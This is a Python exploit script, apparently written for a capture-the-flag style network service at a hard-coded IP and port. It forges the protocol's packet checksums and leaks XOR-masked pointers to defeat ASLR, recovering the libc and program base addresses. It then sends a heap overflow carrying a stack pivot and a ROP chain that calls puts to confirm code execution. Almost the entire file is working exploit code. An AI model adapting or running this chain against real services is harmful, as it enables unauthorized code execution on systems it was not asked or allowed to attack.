#!/usr/bin/env python3
"""Diagnostic: pivot + puts(report) to see if ROP runs."""
import socket, struct, re, sys

HOST, PORT = "144.79.188.39", 37082
C = 0x5A5A5A5A41414141
PUTS_OFF = 0x83CC0
POP_RDI = 0x26542
MSG = b"ROP_OK_FROM_HEAP\x00"


def rd(s, t=1.5):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf


def checksum(ptype, plen, payload, token):
    x = ((((ptype << 24) & 0xFFFFFFFF) ^ token) & 0xFFFFFFFF) ^ plen
    x ^= 0x31415926
    x &= 0xFFFFFFFF
    for i in range(plen):
        x = ((x << 5) | (x >> 27)) & 0xFFFFFFFF
        x = (x + ((i * 0x45D9F3B) ^ payload[i])) & 0xFFFFFFFF
    return x & 0xFFFFFFFF


def send_packet(s, ptype, payload, token):
    plen = len(payload)
    ck = checksum(ptype, plen, payload, token)
    s.sendall(f"{ptype}\n{plen}\n{ck:x}\n".encode() + payload)


s = socket.create_connection((HOST, PORT), timeout=8)
banner = rd(s, 2.0)
token = int(re.search(rb"session token: ([0-9a-f]{8})", banner).group(1), 16)
tok12 = (token & 0xFFFFFFFF) << 12

def pkt(pt, pl, t=1.5):
    send_packet(s, pt, pl, token)
    return rd(s, t)

pkt(2, struct.pack("<I", (token ^ 0xC0FFEE00) & 0xFFFFFFFF))
pkt(3, struct.pack("<H", 0x80) + b"A" * 0x80)
pkt(4, b"Z")
puts = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"P")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
report = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"R")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
fp0 = (int(re.search(rb"0x([0-9a-f]+)", pkt(4, b"D")).group(1), 16) ^ C ^ tok12) & 0xFFFFFFFFFFFFFFFF
libc = puts - PUTS_OFF
pie = fp0 - 0x157F
print(f"libc {hex(libc)} pie {hex(pie)} report {hex(report)}", flush=True)

ov = bytearray(0x200)
ov[0xB0 : 0xB0 + len(MSG)] = MSG
struct.pack_into("<Q", ov, 0xD0, pie + 0x15E2)
struct.pack_into("<Q", ov, 0xD8, libc + POP_RDI)
struct.pack_into("<Q", ov, 0xE0, report)
struct.pack_into("<Q", ov, 0xE8, puts)
pkt(3, struct.pack("<H", 0x200) + bytes(ov))
print("ANALYZE", pkt(5, b"", t=4.0), flush=True)
s.close()
